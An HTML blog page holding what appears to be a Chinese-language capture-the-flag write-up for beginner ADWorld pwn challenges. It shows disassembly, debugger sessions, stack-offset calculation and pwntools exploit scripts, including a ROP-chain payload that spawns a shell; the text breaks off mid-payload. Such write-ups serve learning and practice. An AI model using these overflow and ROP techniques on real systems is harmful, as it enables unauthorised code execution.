<!doctype html><html lang=en-us><head><meta charset=utf-8><meta http-equiv=content-type content="text/html"><meta name=viewport content="width=device-width,initial-scale=1"><title itemprop=name>ADWorld 0 | The Space Between Us</title><meta property="og:title" content="ADWorld 0 | The Space Between Us"><meta name=twitter:title content="ADWorld 0 | The Space Between Us"><meta itemprop=name content="ADWorld 0 | The Space Between Us"><meta name=application-name content="ADWorld 0 | The Space Between Us"><meta property="og:site_name" content="Vincebye's Blog"><meta name=description content="Minimal Hugo blog theme with light and dark mode support"><meta itemprop=description content="Minimal Hugo blog theme with light and dark mode support"><meta property="og:description" content="Minimal Hugo blog theme with light and dark mode support"><meta name=twitter:description content="Minimal Hugo blog theme with light and dark mode support"><meta property="og:locale" content="en-us"><meta name=language content="en-us"><meta itemprop=image content="https://vincebye.github.io/"><meta property="og:image" content="https://vincebye.github.io/"><meta name=twitter:image content="https://vincebye.github.io/"><meta name=twitter:image:src content="https://vincebye.github.io/"><meta property="og:type" content="article"><meta property="og:article:published_time" content="2021-08-03T14:14:45+0800"><meta property="article:published_time" content="2021-08-03T14:14:45+0800"><script defer type=application/ld+json>{"@context":"http://schema.org","@type":"Article","headline":"ADWorld 0","author":{"@type":"Person","name":""},"datePublished":"2021-08-03","description":"","wordCount":3649,"mainEntityOfPage":"True","dateModified":"2021-08-03","image":{"@type":"imageObject","url":""},"publisher":{"@type":"Organization","name":"The Space Between Us"}}</script><meta name=generator content="Hugo 0.111.3"><script async src="https://www.googletagmanager.com/gtag/js?id=G-GKH5P9VW55"></script>
<script>window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag("js",new Date),gtag("config","G-GKH5P9VW55")</script><link rel=canonical href=https://vincebye.github.io/posts/adworld-0/><link href=/sass/main.min.0eebb6db90b4ec9f4444ef402f08421ee056025ba860df3d749a9f299d472008.css rel=stylesheet><link href=/code-highlight.min.706d31975fec544a864cb7f0d847a73ea55ca1df91bf495fd12a177138d807cf.css rel=stylesheet><link rel=apple-touch-icon sizes=180x180 href=/images/favicon/apple-touch-icon.png><link rel=icon type=image/png sizes=32x32 href=/images/favicon/favicon-32x32.png><link rel=icon type=image/png sizes=16x16 href=/images/favicon/favicon-16x16.png><link rel=manifest href=/images/favicon/site.webmanifest><link rel=mask-icon href=/images/favicon/safari-pinned-tab.svg color=#5bbad5><link rel="shortcut icon" href=/images/favicon/favicon.ico><meta name=msapplication-TileColor content="#2b5797"><meta name=msapplication-config content="/images/favicon/browserconfig.xml"><meta name=theme-color content="#ffffff"><link rel=icon type=image/svg+xml href=/images/favicon/favicon.svg><script async src="https://www.googletagmanager.com/gtag/js?id=G-GKH5P9VW55"></script>
<script>var doNotTrack=!1;if(!doNotTrack){window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag("js",new Date),gtag("config","G-GKH5P9VW55",{anonymize_ip:!1})}</script></head><body data-theme=dark class=notransition><script src=https://vincebye.github.io/js/themeLoader.min.4e9e1a253d543bbfec02e7f2460d9621e719fd739dc8a5256faa91cda6e12e03.js></script><div class=navbar role=navigation><nav class=menu aria-label="Main Navigation"><a href=/ class=logo><svg xmlns="http://www.w3.org/2000/svg" width="25" height="25" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-home"><title>Home</title><path d="M3 9l9-7 9 7v11a2 2 0 01-2 2H5a2 2 0 01-2-2z"/><polyline points="9 22 9 12 15 12 15 22"/></svg></a><input type=checkbox id=menu-trigger class=menu-trigger>
<label for=menu-trigger><span class=menu-icon><svg xmlns="http://www.w3.org/2000/svg" width="25" height="25" stroke="currentcolor" fill="none" viewBox="0 0 14 14"><title>Menu</title><path stroke-linecap="round" stroke-linejoin="round" d="M10.595 7H3.40726"/><path stroke-linecap="round" stroke-linejoin="round" d="M10.5096 3.51488H3.49301"/><path stroke-linecap="round" stroke-linejoin="round" d="M10.5096 10.4851H3.49301"/><path stroke-linecap="round" stroke-linejoin="round" d="M.5 12.5V1.5c0-.552285.447715-1 1-1h11C13.0523.5 13.5.947715 13.5 1.5v11C13.5 13.0523 13.0523 13.5 12.5 13.5H1.5C.947715 13.5.5 13.0523.5 12.5z"/></svg></span></label><div class=trigger><ul class=trigger-container><li><a class=menu-link href=/>Home</a></li><li><a class="menu-link active" href=/posts/>Posts</a></li><li><a class=menu-link href=/about/>About</a></li><li class=menu-separator><span>|</span></li></ul><a id=mode href=#><svg xmlns="http://www.w3.org/2000/svg" class="mode-sunny" width="21" height="21" viewBox="0 0 14 14" stroke-width="1"><title>LIGHT</title><g><circle cx="7" cy="7" r="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"/><line x1="7" y1=".5" x2="7" y2="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"/><line x1="2.4" y1="2.4" x2="3.82" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"/><line x1=".5" y1="7" x2="2.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"/><line x1="2.4" y1="11.6" x2="3.82" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"/><line x1="7" y1="13.5" x2="7" y2="11.5" fill="none" stroke-linecap="round" stroke-linejoin="round"/><line x1="11.6" y1="11.6" x2="10.18" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"/><line x1="13.5" y1="7" x2="11.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"/><line x1="11.6" y1="2.4" x2="10.18" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"/></g></svg><svg xmlns="http://www.w3.org/2000/svg" class="mode-moon" width="21" height="21" viewBox="0 0 14 14" stroke-width="1"><title>DARK</title><g><circle cx="7" cy="7" r="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"/><line x1="7" y1=".5" x2="7" y2="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"/><line x1="2.4" y1="2.4" x2="3.82" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"/><line x1=".5" y1="7" x2="2.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"/><line x1="2.4" y1="11.6" x2="3.82" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"/><line x1="7" y1="13.5" x2="7" y2="11.5" fill="none" stroke-linecap="round" stroke-linejoin="round"/><line x1="11.6" y1="11.6" x2="10.18" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"/><line x1="13.5" y1="7" x2="11.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"/><line x1="11.6" y1="2.4" x2="10.18" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"/></g></svg></a></div></nav></div><div class="wrapper post">   <main class=page-content aria-label=Content>       <article>           <header class=header>               <h1 class=header-title>ADWorld 0</h1>               
               <div class=post-meta>                    <time datetime=2021-08-03T14:14:45+08:00 itemprop=datePublished>3 Aug 2021</time>
               </div>           </header>           <div class=page-content>               <h1 id=get_shell>get_shell</h1><p>直接nc连接上去，然后cat flag</p><h1 id=hello_pwn>Hello_Pwn</h1><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>pwndbg&gt; info functions 
</span></span><span class=line><span class=cl>All defined functions:
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Non-debugging symbols:
</span></span><span class=line><span class=cl>0x0000000000400520  puts@plt
</span></span><span class=line><span class=cl>0x0000000000400530  setbuf@plt
</span></span><span class=line><span class=cl>0x0000000000400540  system@plt
</span></span><span class=line><span class=cl>0x0000000000400550  alarm@plt
</span></span><span class=line><span class=cl>0x0000000000400560  read@plt
</span></span><span class=line><span class=cl>0x0000000000400570  __libc_start_main@plt
</span></span><span class=line><span class=cl>0x0000000000400580  __gmon_start__@plt
</span></span></code></pre></div><p>查看一下main函数</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=p>;</span> DATA XREF from entry0 @ 0x4005ad
</span></span><span class=line><span class=cl>┌ 104: int main <span class=o>(</span>int argc, char **argv, char **envp<span class=o>)</span><span class=p>;</span>
</span></span><span class=line><span class=cl>│           0x0040069b      <span class=m>55</span>             push rbp
</span></span><span class=line><span class=cl>│           0x0040069c      4889e5         mov rbp, rsp
</span></span><span class=line><span class=cl>│           0x0040069f      bf3c000000     mov edi, 0x3c               <span class=p>;</span> <span class=s1>&#39;&lt;&#39;</span> <span class=p>;</span> <span class=m>60</span>
</span></span><span class=line><span class=cl>│           0x004006a4      e8a7feffff     call sym.imp.alarm
</span></span><span class=line><span class=cl>│           0x004006a9      488b05a80920.  mov rax, qword <span class=o>[</span>obj.stdout<span class=o>]</span> <span class=p>;</span> <span class=o>[</span>0x601058:8<span class=o>]=</span><span class=m>0</span>
</span></span><span class=line><span class=cl>│           0x004006b0      be00000000     mov esi, <span class=m>0</span>                  <span class=p>;</span> char *buf
</span></span><span class=line><span class=cl>│           0x004006b5      4889c7         mov rdi, rax                <span class=p>;</span> FILE *stream
</span></span><span class=line><span class=cl>│           0x004006b8      e873feffff     call sym.imp.setbuf         <span class=p>;</span> void setbuf<span class=o>(</span>FILE *stream, char *buf<span class=o>)</span>
</span></span><span class=line><span class=cl>│           0x004006bd      bfa1074000     mov edi, str.welcome_to_ctf <span class=p>;</span> 0x4007a1 <span class=p>;</span> <span class=s2>&#34;~~ welcome to ctf ~~     &#34;</span> <span class=p>;</span> const char *s
</span></span><span class=line><span class=cl>│           0x004006c2      e859feffff     call sym.imp.puts           <span class=p>;</span> int puts<span class=o>(</span>const char *s<span class=o>)</span>
</span></span><span class=line><span class=cl>│           0x004006c7      bfbb074000     mov edi, str.lets_get_helloworld_for_bof <span class=p>;</span> 0x4007bb <span class=p>;</span> <span class=s2>&#34;lets get helloworld for bof&#34;</span> <span class=p>;</span> const char *s
</span></span><span class=line><span class=cl>│           0x004006cc      e84ffeffff     call sym.imp.puts           <span class=p>;</span> int puts<span class=o>(</span>const char *s<span class=o>)</span>
</span></span><span class=line><span class=cl>│           0x004006d1      ba10000000     mov edx, 0x10               <span class=p>;</span> rdx <span class=p>;</span> size_t nbyte
</span></span><span class=line><span class=cl>│           0x004006d6      be68106000     mov esi, 0x601068           <span class=p>;</span> rsi <span class=p>;</span> void *buf
</span></span><span class=line><span class=cl>│           0x004006db      bf00000000     mov edi, <span class=m>0</span>                  <span class=p>;</span> int fildes
</span></span><span class=line><span class=cl>│           0x004006e0      e87bfeffff     call sym.imp.read           <span class=p>;</span> ssize_t read<span class=o>(</span>int fildes, void *buf, size_t nbyte<span class=o>)</span>
</span></span><span class=line><span class=cl>│           0x004006e5      8b0581092000   mov eax, dword <span class=o>[</span>0x0060106c<span class=o>]</span> <span class=p>;</span> <span class=o>[</span>0x60106c:4<span class=o>]=</span><span class=m>0</span>
</span></span><span class=line><span class=cl>│           0x004006eb      3d6161756e     cmp eax, 0x6e756161
</span></span><span class=line><span class=cl>│       ┌─&lt; 0x004006f0      750a           jne 0x4006fc
</span></span><span class=line><span class=cl>│       │   0x004006f2      b800000000     mov eax, <span class=m>0</span>
</span></span><span class=line><span class=cl>│       │   0x004006f7      e88affffff     call fcn.00400686
</span></span><span class=line><span class=cl>│       │   <span class=p>;</span> CODE XREF from main @ 0x4006f0
</span></span><span class=line><span class=cl>│       └─&gt; 0x004006fc      b800000000     mov eax, <span class=m>0</span>
</span></span><span class=line><span class=cl>│           0x00400701      5d             pop rbp
</span></span><span class=line><span class=cl>└           0x00400702      c3             ret
</span></span></code></pre></div><p>cmp中与0x6e756161比较的数值来自eax，而eax来自[0x0060106c]即read输入的地址0x601068+4</p><p>构造EXP</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>from pwn import *
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nv>p</span> <span class=o>=</span> process<span class=o>(</span><span class=s2>&#34;./hellopwn&#34;</span><span class=o>)</span>
</span></span><span class=line><span class=cl><span class=c1>#p = remote(&#34;111.198.29.45&#34;,53314)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nv>payload</span> <span class=o>=</span> b<span class=s1>&#39;a&#39;</span> * <span class=m>4</span>
</span></span><span class=line><span class=cl><span class=nv>payload</span> <span class=o>+=</span> p64<span class=o>(</span>0x6e756161<span class=o>)</span>
</span></span><span class=line><span class=cl>p.sendlineafter<span class=o>(</span><span class=s2>&#34;lets get helloworld for bof\n&#34;</span>,payload<span class=o>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>p.interactive<span class=o>()</span>
</span></span></code></pre></div><h1 id=level-0>Level 0</h1><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>vincebye@ubuntu:~/ctf/adworld/level0$ rabin2 -z 291721f42a044f50a2aead748d539df0 
</span></span><span class=line><span class=cl><span class=o>[</span>Strings<span class=o>]</span>
</span></span><span class=line><span class=cl>nth paddr      vaddr      len size section <span class=nb>type</span>  string
</span></span><span class=line><span class=cl>―――――――――――――――――――――――――――――――――――――――――――――――――――――――
</span></span><span class=line><span class=cl><span class=m>0</span>   0x00000684 0x00400684 <span class=m>7</span>   <span class=m>8</span>    .rodata ascii /bin/sh
</span></span><span class=line><span class=cl><span class=m>1</span>   0x0000068c 0x0040068c <span class=m>13</span>  <span class=m>14</span>   .rodata ascii Hello, World<span class=se>\n</span>
</span></span><span class=line><span class=cl>vincebye@ubuntu:~/ctf/adworld/level0$ ./291721f42a044f50a2aead748d539df0 
</span></span><span class=line><span class=cl>Hello, World
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>vincebye@ubuntu:~/ctf/adworld/level0$ rabin2 -i 291721f42a044f50a2aead748d539df0 
</span></span><span class=line><span class=cl><span class=o>[</span>Imports<span class=o>]</span>
</span></span><span class=line><span class=cl>nth vaddr      <span class=nb>bind</span>   <span class=nb>type</span>   lib name
</span></span><span class=line><span class=cl>―――――――――――――――――――――――――――――――――――――
</span></span><span class=line><span class=cl><span class=m>1</span>   0x00400450 GLOBAL FUNC       write
</span></span><span class=line><span class=cl><span class=m>2</span>   0x00400460 GLOBAL FUNC       system
</span></span><span class=line><span class=cl><span class=m>3</span>   0x00400470 GLOBAL FUNC       <span class=nb>read</span>
</span></span><span class=line><span class=cl><span class=m>4</span>   0x00400480 GLOBAL FUNC       __libc_start_main
</span></span><span class=line><span class=cl><span class=m>5</span>   0x00400490 WEAK   NOTYPE     __gmon_start__
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>vincebye@ubuntu:~/ctf/adworld/level0$ rabin2 -qs 291721f42a044f50a2aead748d539df0 <span class=p>|</span> grep -ve imp -e <span class=s1>&#39; 0 &#39;</span>
</span></span><span class=line><span class=cl>0x00600a58 <span class=m>1</span> completed.6661
</span></span><span class=line><span class=cl>0x00400670 <span class=m>2</span> __libc_csu_fini
</span></span><span class=line><span class=cl>0x004005a6 <span class=m>32</span> vulnerable_function
</span></span><span class=line><span class=cl>0x00400596 <span class=m>16</span> callsystem
</span></span><span class=line><span class=cl>0x00400680 <span class=m>4</span> _IO_stdin_used
</span></span><span class=line><span class=cl>0x00400600 <span class=m>101</span> __libc_csu_init
</span></span><span class=line><span class=cl>0x004005c6 <span class=m>47</span> main
</span></span><span class=line><span class=cl>vincebye@ubuntu:~/ctf/adworld/level0$ gdb 291721f42a044f50a2aead748d539df0 
</span></span><span class=line><span class=cl>GNU gdb <span class=o>(</span>Ubuntu 8.1.1-0ubuntu1<span class=o>)</span> 8.1.1
</span></span><span class=line><span class=cl>Copyright <span class=o>(</span>C<span class=o>)</span> <span class=m>2018</span> Free Software Foundation, Inc.
</span></span><span class=line><span class=cl>License GPLv3+: GNU GPL version <span class=m>3</span> or later &lt;http://gnu.org/licenses/gpl.html&gt;
</span></span><span class=line><span class=cl>This is free software: you are free to change and redistribute it.
</span></span><span class=line><span class=cl>There is NO WARRANTY, to the extent permitted by law.  Type <span class=s2>&#34;show copying&#34;</span>
</span></span><span class=line><span class=cl>and <span class=s2>&#34;show warranty&#34;</span> <span class=k>for</span> details.
</span></span><span class=line><span class=cl>This GDB was configured as <span class=s2>&#34;x86_64-linux-gnu&#34;</span>.
</span></span><span class=line><span class=cl>Type <span class=s2>&#34;show configuration&#34;</span> <span class=k>for</span> configuration details.
</span></span><span class=line><span class=cl>For bug reporting instructions, please see:
</span></span><span class=line><span class=cl>&lt;http://www.gnu.org/software/gdb/bugs/&gt;.
</span></span><span class=line><span class=cl>Find the GDB manual and other documentation resources online at:
</span></span><span class=line><span class=cl>&lt;http://www.gnu.org/software/gdb/documentation/&gt;.
</span></span><span class=line><span class=cl>For help, <span class=nb>type</span> <span class=s2>&#34;help&#34;</span>.
</span></span><span class=line><span class=cl>Type <span class=s2>&#34;apropos word&#34;</span> to search <span class=k>for</span> commands related to <span class=s2>&#34;word&#34;</span>...
</span></span><span class=line><span class=cl>pwndbg: loaded <span class=m>194</span> commands. Type pwndbg <span class=o>[</span>filter<span class=o>]</span> <span class=k>for</span> a list.
</span></span><span class=line><span class=cl>pwndbg: created <span class=nv>$rebase</span>, <span class=nv>$ida</span> gdb functions <span class=o>(</span>can be used with print/break<span class=o>)</span>
</span></span><span class=line><span class=cl>Reading symbols from 291721f42a044f50a2aead748d539df0...<span class=o>(</span>no debugging symbols found<span class=o>)</span>...done.
</span></span><span class=line><span class=cl>pwndbg&gt; checksec
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> <span class=s1>&#39;/home/vincebye/ctf/adworld/level0/291721f42a044f50a2aead748d539df0&#39;</span>
</span></span><span class=line><span class=cl>    Arch:     amd64-64-little
</span></span><span class=line><span class=cl>    RELRO:    No RELRO
</span></span><span class=line><span class=cl>    Stack:    No canary found
</span></span><span class=line><span class=cl>    NX:       NX enabled
</span></span><span class=line><span class=cl>    PIE:      No PIE <span class=o>(</span>0x400000<span class=o>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>pwndbg&gt; disassemble vulnerable_function
</span></span><span class=line><span class=cl>Dump of assembler code <span class=k>for</span> <span class=k>function</span> vulnerable_function:
</span></span><span class=line><span class=cl>   0x00000000004005a6 &lt;+0&gt;:	push   rbp
</span></span><span class=line><span class=cl>   0x00000000004005a7 &lt;+1&gt;:	mov    rbp,rsp
</span></span><span class=line><span class=cl>   0x00000000004005aa &lt;+4&gt;:	add    rsp,0xffffffffffffff80
</span></span><span class=line><span class=cl>   0x00000000004005ae &lt;+8&gt;:	lea    rax,<span class=o>[</span>rbp-0x80<span class=o>]</span>
</span></span><span class=line><span class=cl>   0x00000000004005b2 &lt;+12&gt;:	mov    edx,0x200
</span></span><span class=line><span class=cl>   0x00000000004005b7 &lt;+17&gt;:	mov    rsi,rax
</span></span><span class=line><span class=cl>   0x00000000004005ba &lt;+20&gt;:	mov    edi,0x0
</span></span><span class=line><span class=cl>   0x00000000004005bf &lt;+25&gt;:	call   0x400470 &lt;read@plt&gt;
</span></span><span class=line><span class=cl>   0x00000000004005c4 &lt;+30&gt;:	leave  
</span></span><span class=line><span class=cl>   0x00000000004005c5 &lt;+31&gt;:	ret    
</span></span><span class=line><span class=cl>End of assembler dump.
</span></span><span class=line><span class=cl>pwndbg&gt; disassemble main
</span></span><span class=line><span class=cl>Dump of assembler code <span class=k>for</span> <span class=k>function</span> main:
</span></span><span class=line><span class=cl>   0x00000000004005c6 &lt;+0&gt;:	push   rbp
</span></span><span class=line><span class=cl>   0x00000000004005c7 &lt;+1&gt;:	mov    rbp,rsp
</span></span><span class=line><span class=cl>   0x00000000004005ca &lt;+4&gt;:	sub    rsp,0x10
</span></span><span class=line><span class=cl>   0x00000000004005ce &lt;+8&gt;:	mov    DWORD PTR <span class=o>[</span>rbp-0x4<span class=o>]</span>,edi
</span></span><span class=line><span class=cl>   0x00000000004005d1 &lt;+11&gt;:	mov    QWORD PTR <span class=o>[</span>rbp-0x10<span class=o>]</span>,rsi
</span></span><span class=line><span class=cl>   0x00000000004005d5 &lt;+15&gt;:	mov    edx,0xd
</span></span><span class=line><span class=cl>   0x00000000004005da &lt;+20&gt;:	mov    esi,0x40068c
</span></span><span class=line><span class=cl>   0x00000000004005df &lt;+25&gt;:	mov    edi,0x1
</span></span><span class=line><span class=cl>   0x00000000004005e4 &lt;+30&gt;:	call   0x400450 &lt;write@plt&gt;
</span></span><span class=line><span class=cl>   0x00000000004005e9 &lt;+35&gt;:	mov    eax,0x0
</span></span><span class=line><span class=cl>   0x00000000004005ee &lt;+40&gt;:	call   0x4005a6 &lt;vulnerable_function&gt;
</span></span><span class=line><span class=cl>   0x00000000004005f3 &lt;+45&gt;:	leave  
</span></span><span class=line><span class=cl>   0x00000000004005f4 &lt;+46&gt;:	ret    
</span></span><span class=line><span class=cl>End of assembler dump.
</span></span><span class=line><span class=cl>pwndbg&gt; disassemble callsystem
</span></span><span class=line><span class=cl>Dump of assembler code <span class=k>for</span> <span class=k>function</span> callsystem:
</span></span><span class=line><span class=cl>   0x0000000000400596 &lt;+0&gt;:	push   rbp
</span></span><span class=line><span class=cl>   0x0000000000400597 &lt;+1&gt;:	mov    rbp,rsp
</span></span><span class=line><span class=cl>   0x000000000040059a &lt;+4&gt;:	mov    edi,0x400684
</span></span><span class=line><span class=cl>   0x000000000040059f &lt;+9&gt;:	call   0x400460 &lt;system@plt&gt;
</span></span><span class=line><span class=cl>   0x00000000004005a4 &lt;+14&gt;:	pop    rbp
</span></span><span class=line><span class=cl>   0x00000000004005a5 &lt;+15&gt;:	ret
</span></span></code></pre></div><p>关键信息</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=m>2</span>   0x00400460 GLOBAL FUNC       system
</span></span><span class=line><span class=cl><span class=m>0</span>   0x00400684 <span class=m>7</span>   <span class=m>8</span>    .rodata ascii /bin/sh
</span></span></code></pre></div><p><a href=https://www.mi1k7ea.com/2019/04/09/%E8%92%B8%E7%B1%B3ROP%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/#0x02-64%E4%BD%8DROP>有关64位ELF栈偏移计算理论支持</a></p><p>计算栈偏移</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>pwndbg&gt; cy <span class=m>300</span>
</span></span><span class=line><span class=cl>aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaac
</span></span><span class=line><span class=cl>pwndbg&gt; r
</span></span><span class=line><span class=cl>Starting program: /home/vincebye/ctf/adworld/level0/291721f42a044f50a2aead748d539df0 
</span></span><span class=line><span class=cl>Hello, World
</span></span><span class=line><span class=cl>aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaac
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Program received signal SIGSEGV, Segmentation fault.
</span></span><span class=line><span class=cl>0x00000000004005c5 in vulnerable_function <span class=o>()</span>
</span></span><span class=line><span class=cl>LEGEND: STACK <span class=p>|</span> HEAP <span class=p>|</span> CODE <span class=p>|</span> DATA <span class=p>|</span> RWX <span class=p>|</span> RODATA
</span></span><span class=line><span class=cl>───────────────────────────────────────────────────────────────────────────────────────────────<span class=o>[</span> REGISTERS <span class=o>]</span>────────────────────────────────────────────────────────────────────────────────────────────────
</span></span><span class=line><span class=cl> RAX  0x12d
</span></span><span class=line><span class=cl> RBX  0x0
</span></span><span class=line><span class=cl> RCX  0x7ffff7af2151 <span class=o>(</span>read+17<span class=o>)</span> ◂— cmp    rax, -0x1000 /* <span class=s1>&#39;H=&#39;</span> */
</span></span><span class=line><span class=cl> RDX  0x200
</span></span><span class=line><span class=cl> RDI  0x0
</span></span><span class=line><span class=cl> RSI  0x7fffffffde60 ◂— 0x6161616261616161 <span class=o>(</span><span class=s1>&#39;aaaabaaa&#39;</span><span class=o>)</span>
</span></span><span class=line><span class=cl> R8   0x7ffff7dced80 <span class=o>(</span>initial<span class=o>)</span> ◂— 0x0
</span></span><span class=line><span class=cl> R9   0x7ffff7dced80 <span class=o>(</span>initial<span class=o>)</span> ◂— 0x0
</span></span><span class=line><span class=cl> R10  0x3
</span></span><span class=line><span class=cl> R11  0x246
</span></span><span class=line><span class=cl> R12  0x4004a0 <span class=o>(</span>_start<span class=o>)</span> ◂— xor    ebp, ebp
</span></span><span class=line><span class=cl> R13  0x7fffffffdfe0 ◂— 0x1
</span></span><span class=line><span class=cl> R14  0x0
</span></span><span class=line><span class=cl> R15  0x0
</span></span><span class=line><span class=cl> RBP  0x6261616962616168 <span class=o>(</span><span class=s1>&#39;haabiaab&#39;</span><span class=o>)</span>
</span></span><span class=line><span class=cl> RSP  0x7fffffffdee8 ◂— 0x6261616b6261616a <span class=o>(</span><span class=s1>&#39;jaabkaab&#39;</span><span class=o>)</span>
</span></span><span class=line><span class=cl> RIP  0x4005c5 <span class=o>(</span>vulnerable_function+31<span class=o>)</span> ◂— ret    
</span></span><span class=line><span class=cl>─────────────────────────────────────────────────────────────────────────────────────────────────<span class=o>[</span> DISASM <span class=o>]</span>─────────────────────────────────────────────────────────────────────────────────────────────────
</span></span><span class=line><span class=cl> ► 0x4005c5 &lt;vulnerable_function+31&gt;    ret    &lt;0x6261616b6261616a&gt;
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>─────────────────────────────────────────────────────────────────────────────────────────────────<span class=o>[</span> STACK <span class=o>]</span>──────────────────────────────────────────────────────────────────────────────────────────────────
</span></span><span class=line><span class=cl>00:0000│ rsp 0x7fffffffdee8 ◂— 0x6261616b6261616a <span class=o>(</span><span class=s1>&#39;jaabkaab&#39;</span><span class=o>)</span>
</span></span><span class=line><span class=cl>01:0008│     0x7fffffffdef0 ◂— 0x6261616d6261616c <span class=o>(</span><span class=s1>&#39;laabmaab&#39;</span><span class=o>)</span>
</span></span><span class=line><span class=cl>02:0010│     0x7fffffffdef8 ◂— 0x6261616f6261616e <span class=o>(</span><span class=s1>&#39;naaboaab&#39;</span><span class=o>)</span>
</span></span><span class=line><span class=cl>03:0018│     0x7fffffffdf00 ◂— 0x6261617162616170 <span class=o>(</span><span class=s1>&#39;paabqaab&#39;</span><span class=o>)</span>
</span></span><span class=line><span class=cl>04:0020│     0x7fffffffdf08 ◂— 0x6261617362616172 <span class=o>(</span><span class=s1>&#39;raabsaab&#39;</span><span class=o>)</span>
</span></span><span class=line><span class=cl>05:0028│     0x7fffffffdf10 ◂— 0x6261617562616174 <span class=o>(</span><span class=s1>&#39;taabuaab&#39;</span><span class=o>)</span>
</span></span><span class=line><span class=cl>06:0030│     0x7fffffffdf18 ◂— 0x6261617762616176 <span class=o>(</span><span class=s1>&#39;vaabwaab&#39;</span><span class=o>)</span>
</span></span><span class=line><span class=cl>07:0038│     0x7fffffffdf20 ◂— 0x6261617962616178 <span class=o>(</span><span class=s1>&#39;xaabyaab&#39;</span><span class=o>)</span>
</span></span><span class=line><span class=cl>───────────────────────────────────────────────────────────────────────────────────────────────<span class=o>[</span> BACKTRACE <span class=o>]</span>────────────────────────────────────────────────────────────────────────────────────────────────
</span></span><span class=line><span class=cl> ► f <span class=m>0</span>         0x4005c5 vulnerable_function+31
</span></span><span class=line><span class=cl>   f <span class=m>1</span> 0x6261616b6261616a
</span></span><span class=line><span class=cl>   f <span class=m>2</span> 0x6261616d6261616c
</span></span><span class=line><span class=cl>   f <span class=m>3</span> 0x6261616f6261616e
</span></span><span class=line><span class=cl>   f <span class=m>4</span> 0x6261617162616170
</span></span><span class=line><span class=cl>   f <span class=m>5</span> 0x6261617362616172
</span></span><span class=line><span class=cl>   f <span class=m>6</span> 0x6261617562616174
</span></span><span class=line><span class=cl>   f <span class=m>7</span> 0x6261617762616176
</span></span><span class=line><span class=cl>────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
</span></span><span class=line><span class=cl>pwndbg&gt; cyclic -l jaab
</span></span><span class=line><span class=cl><span class=m>136</span>
</span></span></code></pre></div><p>现在要找一个Gadget把字符串存入RDI</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>vincebye@ubuntu:~/ctf/adworld/level0$ ROPgadget --binary 291721f42a044f50a2aead748d539df0 --only <span class=s2>&#34;pop|ret&#34;</span> <span class=p>|</span>grep rdi
</span></span><span class=line><span class=cl>0x0000000000400663 : pop rdi <span class=p>;</span> ret
</span></span></code></pre></div><p>最后大概是这么个结构&rsquo;A&rsquo;*136+pop_rdi+bash_addr+system</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>~~from zio import *
</span></span><span class=line><span class=cl><span class=nv>payload</span><span class=o>=</span>b<span class=s1>&#39;A&#39;</span>*136
</span></span><span class=line><span class=cl><span class=nv>payload</span><span class=o>+=</span>l64<span class=o>(</span>0x0000000000400663<span class=o>)</span>
